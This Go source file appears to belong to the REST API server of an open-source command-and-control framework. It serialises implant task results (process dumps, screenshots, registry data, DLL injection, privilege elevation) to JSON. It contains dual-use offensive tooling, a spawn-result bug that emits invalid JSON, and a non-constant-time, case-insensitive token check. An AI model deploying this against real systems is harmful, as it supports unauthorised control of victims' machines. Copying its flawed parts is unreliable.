package cirrus

import (
	"context"
	"encoding/base64"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/PurpleSec/escape"
	"github.com/PurpleSec/routex"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/c2/task/result"
	"github.com/iDigitalFlame/xmt/com"
)

func isValidName(s string) bool {
	if len(s) == 0 {
		return true
	}
	for i := range s {
		switch {
		case s[i] <= 57 && s[i] >= 48:
		case s[i] <= 90 && s[i] >= 65:
		case s[i] <= 122 && s[i] >= 97:
		case s[i] == 45 || s[i] == 46 || s[i] == 95:
		default:
			return false
		}
	}
	return true
}
func parseJitter(s string) (int, error) {
	v := strings.ReplaceAll(strings.TrimSpace(s), "%", "")
	if len(v) == 0 {
		return 0, errInvalidJitter
	}
	d, err := strconv.ParseUint(v, 10, 8)
	if err != nil {
		return 0, err
	}
	if d > 100 {
		return 0, errInvalidJitter
	}
	return int(d), nil
}
func writeBase64(w io.Writer, b []byte) {
	d := base64.NewEncoder(base64.StdEncoding, w)
	d.Write(b)
	d.Close()
}
func parseSleep(s string) (time.Duration, error) {
	v := strings.ToLower(strings.TrimSpace(s))
	if len(v) == 0 {
		return 0, errInvalidSleep
	}
	switch v[len(v)-1] {
	case 's', 'h', 'm':
	default:
		v += "s"
	}
	d, err := time.ParseDuration(v)
	if err != nil {
		return 0, err
	}
	if d < time.Second || d > time.Hour*24 {
		return 0, errInvalidSleep
	}
	return d, nil
}
func (c *Cirrus) context(_ net.Listener) context.Context {
	return c.ctx
}
func writeJobJSON(t uint8, j *com.Packet, w io.Writer) error {
	if err := writeJobJSONSimple(t, j, w); err != io.ErrClosedPipe {
		return err
	}
	o := base64.NewEncoder(base64.StdEncoding, w)
	switch w.Write([]byte(`{"type":"`)); t {
	case task.MvPwd:
		d, err := result.Pwd(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`pwd", "data":"`))
		o.Write([]byte(d))
	case task.MvScript:
		panic("not implemented")
	case task.TvDownload:
		p, d, n, r, err := result.Download(j)
		if err != nil {
			return err
		}
		w.Write([]byte(
			`download","path":` + escape.JSON(p) +
				`,"size":` + strconv.FormatUint(n, 10) +
				`,"dir":` + strconv.FormatBool(d) + `,"data":"`,
		))
		io.Copy(o, r)
	case task.TvUpload, task.TvPull:
		p, n, err := result.Upload(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`upload","size":` + strconv.FormatUint(n, 10) + `,"data":"`))
		o.Write([]byte(p))
	case task.TvScreenShot, task.TvProcDump:
		r, err := result.ProcessDump(j)
		if err != nil {
			return err
		}
		if t == task.TvProcDump {
			w.Write([]byte(`dump",`))
		} else {
			w.Write([]byte(`shot",`))
		}
		w.Write([]byte(`"data":"`))
		io.Copy(o, r)
	case task.TvExecute, task.TvZombie, task.TvPullExecute:
		p, c, r, err := result.Process(j)
		if err != nil {
			return err
		}
		w.Write([]byte(
			`execute", "pid":` + strconv.FormatUint(uint64(p), 10) +
				`,"exit":` + strconv.Itoa(int(c)) + `,"data":"`),
		)
		io.Copy(o, r)
	default:
		w.Write([]byte(`unknown","data":"`))
		io.Copy(o, j)
	}
	o.Close()
	w.Write([]byte(`"}`))
	j.Seek(0, 0)
	o = nil
	return nil
}
func writeJobJSONSimple(t uint8, j *com.Packet, w io.Writer) error {
	switch t {
	case task.MvCwd:
		w.Write([]byte(`{"type":"cd"}`))
	case task.MvList:
		f, err := result.Ls(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"list","entries":[`)); len(f) > 0 {
			for i := 0; i < len(f); i++ {
				if i > 0 {
					w.Write([]byte(","))
				}
				w.Write([]byte(
					`{"name":` + escape.JSON(f[i].Name()) +
						`,"mode":` + strconv.FormatUint(uint64(f[i].Mode()), 10) +
						`,"mode_str":"` + f[i].Mode().String() +
						`","size":` + strconv.FormatUint(uint64(f[i].Size()), 10) +
						`,"modtime":` + escape.JSON(f[i].ModTime().Format(time.RFC3339)) + `}`,
				))
			}
		}
		w.Write([]byte("]}"))
	case task.MvTime:
		w.Write([]byte(`{"type":"time"}`))
	case task.MvProxy:
		w.Write([]byte(`{"type":"proxy"}`))
	case task.MvSpawn:
		p, err := result.Spawn(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`{"type":"spawn","pid"` + strconv.FormatUint(uint64(p), 10) + `}`))
	case task.TvRename:
		w.Write([]byte(`{"type":"rename"}`))
	case task.MvMounts:
		m, err := result.Mounts(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"mounts","entries":[`)); len(m) > 0 {
			for i := 0; i < len(m); i++ {
				if i > 0 {
					w.Write([]byte(","))
				}
				w.Write([]byte(escape.JSON(m[i])))
			}
		}
		w.Write([]byte("]}"))
	case task.MvRefresh:
		w.Write([]byte(`{"type":"refresh"}`))
	case task.MvMigrate:
		w.Write([]byte(`{"type":"migrate"}`))
	case task.MvElevate:
		w.Write([]byte(`{"type":"elevate"}`))
	case task.MvRevSelf:
		w.Write([]byte(`{"type":"rev2self"}`))
	case task.MvProfile:
		w.Write([]byte(`{"type":"profile"}`))
	case task.TvCheckDLL:
		if r, _ := result.CheckDLL(j); r {
			w.Write([]byte(`{"type":"check_dll","tainted":false}`))
		} else {
			w.Write([]byte(`{"type":"check_dll","tainted":true}`))
		}
	case task.TvProcList:
		p, err := result.ProcessList(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"processes","entries":[`)); len(p) > 0 {
			for i := 0; i < len(p); i++ {
				if i > 0 {
					w.Write([]byte(","))
				}
				w.Write([]byte(
					`{"name":` + escape.JSON(p[i].Name) +
						`,"pid":` + strconv.FormatUint(uint64(p[i].PID), 10) +
						`,"ppid":` + strconv.FormatUint(uint64(p[i].PPID), 10) + `}`,
				))
			}
		}
		w.Write([]byte("]}"))
	case task.TvRegistry:
		e, v, err := result.Registry(j)
		if err != nil {
			return err
		}
		if !v {
			w.Write([]byte(`{"type":"registry", "status":false}`))
			return nil
		}
		if len(e) == 0 {
			w.Write([]byte(`{"type":"registry", "status":true}`))
			return nil
		}
		w.Write([]byte(`{"type":"registry","entries":[`))
		for i := 0; i < len(e); i++ {
			if i > 0 {
				w.Write([]byte(","))
			}
			w.Write([]byte(
				`{"name":` + escape.JSON(e[i].Name) +
					`,"type":` + escape.JSON(e[i].TypeName()) +
					`,"value":` + escape.JSON(e[i].String()) +
					`,"data":"` + base64.StdEncoding.EncodeToString(e[i].Data) + `"}`,
			))
		}
		w.Write([]byte("]}"))
	case task.TvSystemIO:
		p, s, r, err := result.SystemIO(j)
		if err != nil {
			return err
		}
		if !r {
			w.Write([]byte(`{"type":"system_io", "status":false}`))
			return nil
		}
		if len(p) == 0 && s == 0 {
			w.Write([]byte(`{"type":"system_io", "status":true}`))
			return nil
		}
		w.Write([]byte(
			`{"type":"system_io","path":` + escape.JSON(p) +
				`,"size":` + strconv.FormatUint(s, 10) + `}`,
		))
	case task.TvReloadDLL:
		w.Write([]byte(`{"type":"reload_dll"}`))
	case task.TvAssembly, task.TvDLL:
		h, p, c, err := result.Assembly(j)
		if err != nil {
			return err
		}
		if t == task.TvDLL {
			w.Write([]byte(`{"type":"dll",`))
		} else {
			w.Write([]byte(`{"type":"assembly",`))
		}
		w.Write([]byte(
			`"handle":` + strconv.FormatUint(uint64(h), 10) +
				`,"exit":` + strconv.FormatUint(uint64(c), 10) +
				`,"pid":` + strconv.FormatUint(uint64(p), 10) + `}`,
		))
	default:
		return io.ErrClosedPipe
	}
	return nil
}
func writeError(c int, e string, w http.ResponseWriter, _ *routex.Request) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(c)
	w.Write([]byte(`{"source": "xmt_rest", "code": ` + strconv.Itoa(c) + `, "error": `))
	if len(e) > 0 {
		w.Write([]byte(escape.JSON(e)))
	} else {
		w.Write([]byte(escape.JSON(http.StatusText(c))))
	}
	w.Write([]byte(`}`))
}
func encoding(_ context.Context, w http.ResponseWriter, _ *routex.Request) bool {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	return true
}
func (c *Cirrus) auth(_ context.Context, w http.ResponseWriter, r *routex.Request) bool {
	if len(c.Auth) == 0 {
		return true
	}
	if !strings.EqualFold(r.Header.Get("X-CirrusAuth"), c.Auth) {
		w.WriteHeader(http.StatusUnauthorized)
		return false
	}
	return true
}
func (c *Cirrus) websocket(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	s, err := c.socks.Upgrade(w, r.Request, nil)
	if err != nil {
		writeError(http.StatusInternalServerError, err.Error(), w, r)
		return
	}
	c.events.subscribe(s)
}
